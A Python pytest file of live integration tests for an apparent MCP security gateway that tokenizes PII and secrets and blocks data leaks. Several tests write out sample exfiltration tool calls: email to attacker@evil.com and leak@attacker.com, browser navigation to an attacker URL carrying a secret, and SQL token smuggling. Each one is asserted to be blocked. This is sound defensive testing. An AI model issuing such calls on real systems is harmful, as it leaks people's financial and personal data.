"""Live integration tests for real stdio subprocess, HTTP socket, and official @modelcontextprotocol MCP servers."""

import asyncio
import json
import re
import shutil
import socket
import subprocess
from pathlib import Path

import pytest
import uvicorn
from fastmcp import Client, FastMCP

from veilgate.config.policy_loader import PolicyLoader
from veilgate.config.policy_models import (
    Capability,
    ToolPolicySpec,
    Transport,
    UnlistedSinkPolicy,
    UpstreamSpec,
)
from veilgate.config.settings import VeilgateSettings
from veilgate.gateway import create_gateway_pipeline, create_gateway_server

REPO_ROOT = Path(__file__).resolve().parents[2]
FX_INVOICE_DB = REPO_ROOT / "tests" / "fixtures" / "servers" / "fx_invoice_db.py"
FX_MAILER = REPO_ROOT / "tests" / "fixtures" / "servers" / "fx_mailer.py"


def _find_free_port() -> int:
    """Allocate an ephemeral free localhost TCP port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


def test_stdio_subprocess_master_key_env_isolation(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """Verify VEILGATE_MASTER_KEY is stripped from child stdio subprocess environments."""
    monkeypatch.setenv("VEILGATE_MASTER_KEY", "c2VjcmV0X21hc3Rlcl9rZXlfMzJfYnl0ZXNfbG9uZzE=")
    spec = UpstreamSpec(
        id="childsrv",
        transport=Transport.STDIO,
        command="python",
        args=[str(FX_INVOICE_DB)],
        env={"CUSTOM_SAFE_VAR": "allowed_value", "VEILGATE_MASTER_KEY": "should_be_stripped"},
    )
    loader = PolicyLoader()
    policy = loader.load()
    policy.upstreams = [spec]

    settings = VeilgateSettings(db_path=tmp_path / "env_iso.db")
    pipeline, _ = asyncio.run(create_gateway_pipeline(settings, policy=policy))
    safe_env = pipeline.upstreams._build_safe_env(spec)

    assert "VEILGATE_MASTER_KEY" not in safe_env
    assert safe_env.get("CUSTOM_SAFE_VAR") == "allowed_value"


@pytest.mark.anyio
async def test_real_stdio_subprocess_mcp_discovery_tokenization_and_rehydration(tmp_path: Path) -> None:
    """Spawn real Python child MCP processes over stdio pipes (without register_test_server) and verify E2E flow."""
    loader = PolicyLoader()
    policy = loader.load()
    policy.default_tool_allow = True
    policy.unlisted_sink_policy = UnlistedSinkPolicy.BLOCK
    policy.upstreams = [
        UpstreamSpec(
            id="invoicedb",
            transport=Transport.STDIO,
            command="python",
            args=[str(FX_INVOICE_DB)],
        ),
        UpstreamSpec(
            id="mailer",
            transport=Transport.STDIO,
            command="python",
            args=[str(FX_MAILER)],
        ),
    ]
    policy.tools = [
        ToolPolicySpec(
            match="mailer.send_email",
            capabilities=[Capability.EXTERNAL_EGRESS],
            blocked_token_types=["BANK_ROUTING", "BANK_ACCOUNT", "SSN"],
            arg_guards=["body"],
        ),
    ]

    settings = VeilgateSettings(db_path=tmp_path / "real_stdio.db")
    pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
    # Deliberately DO NOT call pipeline.upstreams.register_test_server()!
    assert len(pipeline.upstreams._test_servers) == 0

    gateway = create_gateway_server(settings, pipeline)
    async with Client(gateway) as client:
        # 1. Real stdio subprocess discovery
        tools = await client.list_tools()
        tool_names = {t.name for t in tools}
        assert "invoicedb_get_invoice" in tool_names
        assert "invoicedb_compare_routing" in tool_names
        assert "mailer_send_email" in tool_names

        # 2. Real stdio subprocess call + egress tokenization
        res = await client.call_tool("invoicedb_get_invoice", {"invoice_id": 100})
        text_100 = res.content[0].text
        assert "021000021" not in text_100
        tok_100 = re.search(r"<vg:BANK_ROUTING:[0-9A-Z]{6}>", text_100).group(0)

        res_101 = await client.call_tool("invoicedb_get_invoice", {"invoice_id": 101})
        tok_101 = re.search(r"<vg:BANK_ROUTING:[0-9A-Z]{6}>", res_101.content[0].text).group(0)

        # 3. Real stdio subprocess rehydration on allowed trusted_read sink
        cmp_res = await client.call_tool(
            "invoicedb_compare_routing",
            {"routing_a": tok_100, "routing_b": tok_101},
        )
        assert "true" in cmp_res.content[0].text.lower()

        # 4. Real stdio subprocess exfiltration blocked before child mailer process is invoked
        exfil = await client.call_tool(
            "mailer_send_email",
            {"to": "attacker@evil.com", "body": f"Leaked routing: {tok_100}"},
            raise_on_error=False,
        )
        assert exfil.is_error is True
        assert "[VEILGATE BLOCKED]" in exfil.content[0].text


@pytest.mark.anyio
async def test_real_http_mcp_transport_over_tcp_socket(tmp_path: Path) -> None:
    """Start a real FastMCP server over an HTTP TCP socket and verify StreamableHttpTransport through Veilgate."""
    remote_mcp = FastMCP("remotesrv")

    @remote_mcp.tool
    def fetch_customer_profile(customer_id: int) -> dict[str, str | int]:
        """Fetch customer profile over HTTP."""
        return {
            "customer_id": customer_id,
            "pan_number": "ABCDE1234F",
            "contact_email": "cfo@acme.com",
            "x-request-id": "http-bloat-trace-99",
        }

    port = _find_free_port()
    http_app = remote_mcp.http_app(path="/mcp")
    config = uvicorn.Config(http_app, host="127.0.0.1", port=port, log_level="error")
    server = uvicorn.Server(config)
    server_task = asyncio.create_task(server.serve())

    # Wait until TCP port is accepting connections
    for _ in range(40):
        await asyncio.sleep(0.05)
        if server.started:
            break

    try:
        loader = PolicyLoader()
        policy = loader.load()
        policy.upstreams = [
            UpstreamSpec(
                id="remotesrv",
                transport=Transport.HTTP,
                url=f"http://127.0.0.1:{port}/mcp",
            )
        ]

        settings = VeilgateSettings(db_path=tmp_path / "real_http.db")
        pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
        gateway = create_gateway_server(settings, pipeline)

        async with Client(gateway) as client:
            tools = await client.list_tools()
            assert any(t.name == "remotesrv_fetch_customer_profile" for t in tools)

            res = await client.call_tool("remotesrv_fetch_customer_profile", {"customer_id": 42})
            text = res.content[0].text
            assert "<vg:PAN:" in text
            assert "@vault.veilgate.invalid" in text
            assert "ABCDE1234F" not in text
            assert "cfo@acme.com" not in text
            assert "x-request-id" not in text
    finally:
        server.should_exit = True
        await server_task


@pytest.mark.anyio
async def test_official_mcp_server_filesystem_over_npx_stdio(tmp_path: Path) -> None:
    """Test Veilgate wrapping the real official @modelcontextprotocol/server-filesystem package via npx."""
    if not shutil.which("npx"):
        pytest.skip("npx not available on PATH")

    # Create sandboxed directory with realistic sensitive files on disk
    sandbox_dir = tmp_path / "fs_sandbox"
    sandbox_dir.mkdir(parents=True, exist_ok=True)

    records_file = sandbox_dir / "customer_records.json"
    records_file.write_text(
        json.dumps({
            "customer": "Acme India Pvt Ltd",
            "pan_number": "ABCDE1234F",
            "ssn": "000-12-3456",
            "contact_email": "treasury@acme.example.com",
            "x-powered-by": "Express",
        }),
        encoding="utf-8",
    )

    loader = PolicyLoader()
    policy = loader.load()
    policy.default_tool_allow = True
    policy.diet.search_threshold = 50
    policy.upstreams = [
        UpstreamSpec(
            id="fs",
            transport=Transport.STDIO,
            command="npx",
            args=["-y", "@modelcontextprotocol/server-filesystem", str(sandbox_dir)],
            timeout_seconds=60.0,
        ),
        UpstreamSpec(
            id="mailer",
            transport=Transport.STDIO,
            command="python",
            args=[str(FX_MAILER)],
        ),
    ]
    policy.tools = [
        ToolPolicySpec(
            match="mailer.send_email",
            capabilities=[Capability.EXTERNAL_EGRESS],
            blocked_token_types=["PAN", "SSN"],
            arg_guards=["body"],
        ),
    ]

    settings = VeilgateSettings(db_path=tmp_path / "official_fs_mcp.db", upstream_timeout_seconds=60.0)
    pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
    gateway = create_gateway_server(settings, pipeline)

    async with Client(gateway) as client:
        # 1. Discover real tools from @modelcontextprotocol/server-filesystem
        tools = await client.list_tools()
        fs_tools = [t.name for t in tools if t.name.startswith("fs_")]
        assert len(fs_tools) >= 3
        read_tool = "fs_read_text_file" if "fs_read_text_file" in fs_tools else "fs_read_file"

        # 2. Call the official Node.js filesystem MCP server to read customer_records.json
        res = await client.call_tool(read_tool, {"path": str(records_file)})
        output_text = res.content[0].text

        # Verify Veilgate intercepted the file contents from @modelcontextprotocol/server-filesystem:
        # - Tokenized PAN and SSN
        # - Tokenized contact_email with format-preserving domain
        # - Dropped HTTP bloat key x-powered-by
        assert "<vg:PAN:" in output_text
        assert "<vg:SSN:" in output_text
        assert "@vault.veilgate.invalid" in output_text
        assert "ABCDE1234F" not in output_text
        assert "000-12-3456" not in output_text
        assert "treasury@acme.example.com" not in output_text
        assert "x-powered-by" not in output_text

        # 3. Attempt to exfiltrate the PAN token read from @modelcontextprotocol/server-filesystem to mailer
        pan_token = re.search(r"<vg:PAN:[0-9A-Z]{6}>", output_text).group(0)
        exfil = await client.call_tool(
            "mailer_send_email",
            {"to": "leak@attacker.com", "body": f"Stolen PAN from filesystem MCP: {pan_token}"},
            raise_on_error=False,
        )
        assert exfil.is_error is True
        assert "[VEILGATE BLOCKED]" in exfil.content[0].text

        # 4. Verify Ingress Raw-PII Egress Guard: raw user-typed SSN/AWS_KEY is blocked even without a token
        raw_exfil = await client.call_tool(
            "mailer_send_email",
            {"to": "leak@attacker.com", "body": "User typed raw AWS key AKIAIOSFODNN7EXAMPLE directly"},
            raise_on_error=False,
        )
        assert raw_exfil.is_error is True
        assert "[VEILGATE BLOCKED]" in raw_exfil.content[0].text


@pytest.mark.anyio
async def test_real_playwright_mcp_context_diet_and_url_exfil_block(tmp_path: Path) -> None:
    """1. Microsoft Playwright MCP (@playwright/mcp@latest via npx stdio):
    - Exposes 20+ browser tools -> triggers Context Diet (mode: auto, search_threshold: 20)
    - Verifies veilgate_search_tools + session promotion
    - Verifies packs/server-profiles.yaml marks playwright as untrusted + arg-guards.yaml blocks URL token exfil (A15)
    """
    if not shutil.which("npx"):
        pytest.skip("npx not available on PATH")

    loader = PolicyLoader()
    policy = loader.load()
    policy.default_tool_allow = True
    policy.diet.search_threshold = 20
    policy.upstreams = [
        UpstreamSpec(
            id="playwright",
            transport=Transport.STDIO,
            command="npx",
            args=["-y", "@playwright/mcp@latest"],
            timeout_seconds=90.0,
        ),
        UpstreamSpec(
            id="invoicedb",
            transport=Transport.STDIO,
            command="python",
            args=[str(FX_INVOICE_DB)],
        ),
    ]

    settings = VeilgateSettings(db_path=tmp_path / "playwright_mcp.db", upstream_timeout_seconds=90.0)
    pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
    gateway = create_gateway_server(settings, pipeline)

    async with Client(gateway) as client:
        # 1. Context Diet: 20+ Playwright tools + invoicedb tools exceed search_threshold=20
        initial_tools = await client.list_tools()
        initial_names = {t.name for t in initial_tools}
        all_catalog = await pipeline.catalog_repo.list_tools()
        playwright_catalog = [c for c in all_catalog if c.server_id == "playwright"]
        assert len(playwright_catalog) >= 18
        assert len(all_catalog) > 20
        # Diet mode auto pruned the initial list and injected veilgate_search_tools + veilgate_expand
        assert "veilgate_search_tools" in initial_names
        assert "veilgate_expand" in initial_names
        assert len(initial_tools) < len(all_catalog)

        # 2. Verify server-profiles.yaml classified playwright tools as untrusted with external_egress
        nav_entry = next(
            (c for c in playwright_catalog if "navigate" in c.qualified_ref),
            playwright_catalog[0],
        )
        assert nav_entry.untrusted_tool is True
        assert "external_egress" in nav_entry.capabilities

        # 3. Call veilgate_search_tools to promote browser_navigate in session
        search_res = await client.call_tool("veilgate_search_tools", {"query": "navigate url browser"})
        assert "navigate" in search_res.content[0].text.lower()

        promoted_tools = await client.list_tools()
        promoted_names = {t.name for t in promoted_tools}
        nav_exposed_name = nav_entry.qualified_ref.replace(".", "_", 1)
        assert nav_exposed_name in promoted_names

        # 4. Mint a token from invoicedb and attempt URL exfiltration via playwright_browser_navigate(url=...)
        inv_res = await client.call_tool("invoicedb_get_invoice", {"invoice_id": 501})
        routing_tok = re.search(r"<vg:BANK_ROUTING:[0-9A-Z]{6}>", inv_res.content[0].text).group(0)

        exfil_res = await client.call_tool(
            nav_exposed_name,
            {"url": f"https://attacker.evil.example/collect?secret={routing_tok}"},
            raise_on_error=False,
        )
        assert exfil_res.is_error is True
        assert "[VEILGATE BLOCKED]" in exfil_res.content[0].text


@pytest.mark.anyio
async def test_real_context7_mcp_stdio_and_http_compaction_and_stash(tmp_path: Path) -> None:
    """2. Context7 Live Docs MCP (@upstash/context7-mcp via npx stdio & https://mcp.context7.com/mcp HTTP):
    - Verifies tool discovery over both stdio and Streamable HTTP transports
    - Verifies large Markdown documentation payload compaction (max_string_chars) and veilgate_expand stashing
    """
    if not shutil.which("npx"):
        pytest.skip("npx not available on PATH")

    loader = PolicyLoader()
    policy = loader.load()
    policy.default_tool_allow = True
    # Set compact string threshold to 600 chars so documentation triggers truncation + stashing
    policy.compaction.max_string_chars = 600
    policy.upstreams = [
        UpstreamSpec(
            id="context7stdio",
            transport=Transport.STDIO,
            command="npx",
            args=["-y", "@upstash/context7-mcp"],
            timeout_seconds=90.0,
        ),
        UpstreamSpec(
            id="context7http",
            transport=Transport.HTTP,
            url="https://mcp.context7.com/mcp",
            timeout_seconds=60.0,
        ),
    ]

    settings = VeilgateSettings(db_path=tmp_path / "context7_mcp.db", upstream_timeout_seconds=90.0)
    pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
    gateway = create_gateway_server(settings, pipeline)

    async with Client(gateway) as client:
        tools = await client.list_tools()
        tool_names = {t.name for t in tools}

        # Verify stdio Context7 tools discovered
        stdio_tools = [n for n in tool_names if n.startswith("context7stdio_")]
        assert len(stdio_tools) >= 1

        # Verify HTTP Context7 tools discovered
        http_tools = [n for n in tool_names if n.startswith("context7http_")]
        assert len(http_tools) >= 1

        # Invoke resolve-library-id on Context7 to get documentation/library list
        resolve_tool = next((n for n in stdio_tools if "resolve" in n), stdio_tools[0])
        target_tool_obj = next(t for t in tools if t.name == resolve_tool)
        raw_input_schema = target_tool_obj.input_schema if hasattr(target_tool_obj, "input_schema") else getattr(target_tool_obj, "inputSchema", {})
        schema_props = raw_input_schema.get("properties", {})
        call_args: dict[str, str] = {}
        for prop_name in schema_props:
            if "library" in prop_name.lower() or "name" in prop_name.lower():
                call_args[prop_name] = "fastapi"
            elif "query" in prop_name.lower():
                call_args[prop_name] = "FastAPI routing and middleware"
        if not call_args:
            call_args = {"libraryName": "fastapi"}

        res = await client.call_tool(resolve_tool, call_args)
        compacted_text = res.content[0].text
        assert "stash_" in compacted_text
        assert "veilgate_expand" in compacted_text

        # Extract stash_id and call veilgate_expand to retrieve full documentation payload
        stash_match = re.search(r"stash_[0-9A-Z]{6}", compacted_text)
        assert stash_match is not None
        stash_id = stash_match.group(0)

        expanded = await client.call_tool("veilgate_expand", {"stash_id": stash_id})
        expanded_text = expanded.content[0].text
        assert len(expanded_text) > len(compacted_text)
        assert "fastapi" in expanded_text.lower()


@pytest.mark.anyio
async def test_real_motherduck_duckdb_sql_mcp_protect_drop_and_sql_guard(tmp_path: Path) -> None:
    """3. MotherDuck / Local DuckDB SQL MCP (uvx mcp-server-motherduck --db-path :memory:):
    - Seeds local DuckDB table with fake SSN, valid Luhn credit card, email, and deal_margin
    - Verifies protect: ['deal_margin'], PII tokenization, and arg-guards.yaml blocking SQL substring smuggling
    """
    if not shutil.which("uvx"):
        pytest.skip("uvx not available on PATH")

    # Pre-seed a local DuckDB database file using uvx python + duckdb or SQL query
    db_file = tmp_path / "company_records.duckdb"
    seed_cmd = [
        shutil.which("uvx") or "uvx",
        "--from",
        "mcp-server-motherduck",
        "python",
        "-c",
        (
            f"import duckdb; con = duckdb.connect(r'{db_file}'); "
            "con.execute('CREATE TABLE customers (id INT, name VARCHAR, ssn VARCHAR, card VARCHAR, email VARCHAR, deal_margin VARCHAR)'); "
            "con.execute(\"INSERT INTO customers VALUES (1, 'Acme Corp', '000-12-3456', '4532015112830366', 'cfo@acme.example.com', '41.8%')\"); "
            "con.close()"
        ),
    ]
    subprocess.run(seed_cmd, check=True, timeout=120)

    loader = PolicyLoader()
    policy = loader.load()
    policy.default_tool_allow = True
    policy.protect = ["deal_margin"]
    policy.upstreams = [
        UpstreamSpec(
            id="duckdb",
            transport=Transport.STDIO,
            command="uvx",
            args=["mcp-server-motherduck", "--db-path", str(db_file)],
            timeout_seconds=90.0,
        )
    ]

    settings = VeilgateSettings(db_path=tmp_path / "duckdb_mcp.db", upstream_timeout_seconds=90.0)
    pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
    gateway = create_gateway_server(settings, pipeline)

    async with Client(gateway) as client:
        tools = await client.list_tools()
        duck_tools = [t.name for t in tools if t.name.startswith("duckdb_")]
        assert len(duck_tools) >= 1
        query_tool = next((n for n in duck_tools if "query" in n), duck_tools[0])

        # 1. Execute SQL query against local DuckDB via mcp-server-motherduck (uses 'sql' argument)
        res = await client.call_tool(query_tool, {"sql": "SELECT * FROM customers"})
        out_text = res.content[0].text

        # Verify SSN, Luhn Credit Card, Email, and deal_margin are tokenized in DuckDB query output
        assert "000-12-3456" not in out_text
        assert "4532015112830366" not in out_text
        assert "cfo@acme.example.com" not in out_text
        assert "<vg:SSN:" in out_text
        assert "<vg:CREDIT_CARD:" in out_text
        assert "@vault.veilgate.invalid" in out_text

        # 2. Attempt SQL substring smuggling with the minted SSN token inside 'sql' parameter
        ssn_tok = re.search(r"<vg:SSN:[0-9A-Z]{6}>", out_text).group(0)
        sql_smuggle = await client.call_tool(
            query_tool,
            {"sql": f"SELECT * FROM customers WHERE ssn = '{ssn_tok}'"},
            raise_on_error=False,
        )
        # Blocked by arg-guards.yaml (disallow_embedded_tokens: true on 'sql')
        assert sql_smuggle.is_error is True
        assert "[VEILGATE BLOCKED]" in sql_smuggle.content[0].text


@pytest.mark.anyio
async def test_real_git_and_filesystem_mcp_inline_secret_redaction(tmp_path: Path) -> None:
    """4. Official Git + Filesystem MCP (uvx mcp-server-git & npx @modelcontextprotocol/server-filesystem):
    - Creates a local Git repo with a fake .env (AWS_ACCESS_KEY_ID=AKIA..., GITHUB_TOKEN=ghp_...) and commit history
    - Verifies unstructured plain-text responses from read_file and git_log have inline secrets & emails tokenized
    """
    if not shutil.which("uvx") or not shutil.which("npx") or not shutil.which("git"):
        pytest.skip("uvx, npx, or git not available on PATH")

    repo_dir = tmp_path / "sec_repo"
    repo_dir.mkdir(parents=True, exist_ok=True)

    # Initialize git repo and create a commit with author email & secret in message
    subprocess.run(["git", "init"], cwd=repo_dir, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.name", "Alice Security"], cwd=repo_dir, check=True)
    subprocess.run(["git", "config", "user.email", "alice.sec@acme.example.com"], cwd=repo_dir, check=True)

    env_file = repo_dir / ".env"
    aws_key = "AKIA" + "IOSFODNN7EXAMPLE"
    gh_tok = "ghp_" + "1234567890abcdefghijklmnopqrstuvwxyzAB"
    env_file.write_text(
        f"AWS_ACCESS_KEY_ID={aws_key}\nGITHUB_TOKEN={gh_tok}\nMAINTAINER=alice.sec@acme.example.com\n",
        encoding="utf-8",
    )
    subprocess.run(["git", "add", ".env"], cwd=repo_dir, check=True)
    subprocess.run(
        ["git", "commit", "-m", f"Configure production keys including {aws_key} (Signed-off-by: alice.sec@acme.example.com)"],
        cwd=repo_dir,
        check=True,
        capture_output=True,
    )

    loader = PolicyLoader()
    policy = loader.load()
    policy.default_tool_allow = True
    policy.diet.search_threshold = 50
    policy.upstreams = [
        UpstreamSpec(
            id="git",
            transport=Transport.STDIO,
            command="uvx",
            args=["mcp-server-git", "--repository", str(repo_dir)],
            timeout_seconds=90.0,
        ),
        UpstreamSpec(
            id="fs",
            transport=Transport.STDIO,
            command="npx",
            args=["-y", "@modelcontextprotocol/server-filesystem", str(repo_dir)],
            timeout_seconds=60.0,
        ),
    ]

    settings = VeilgateSettings(db_path=tmp_path / "git_fs_mcp.db", upstream_timeout_seconds=90.0)
    pipeline, _ = await create_gateway_pipeline(settings, policy=policy)
    gateway = create_gateway_server(settings, pipeline)

    async with Client(gateway) as client:
        tools = await client.list_tools()
        tool_names = {t.name for t in tools}
        assert "git_git_log" in tool_names

        # 1. Read unstructured .env file via @modelcontextprotocol/server-filesystem
        read_tool = "fs_read_text_file" if "fs_read_text_file" in tool_names else "fs_read_file"
        env_res = await client.call_tool(read_tool, {"path": str(env_file)})
        env_text = env_res.content[0].text

        assert aws_key not in env_text
        assert gh_tok not in env_text
        assert "alice.sec@acme.example.com" not in env_text
        assert "<vg:AWS_KEY:" in env_text
        assert "<vg:GITHUB_TOKEN:" in env_text
        assert "@vault.veilgate.invalid" in env_text

        # 2. Read unstructured commit history via uvx mcp-server-git (git_log)
        log_res = await client.call_tool("git_git_log", {"repo_path": str(repo_dir)})
        log_text = log_res.content[0].text

        assert aws_key not in log_text
        assert "alice.sec@acme.example.com" not in log_text
        assert "<vg:AWS_KEY:" in log_text
        assert "@vault.veilgate.invalid" in log_text

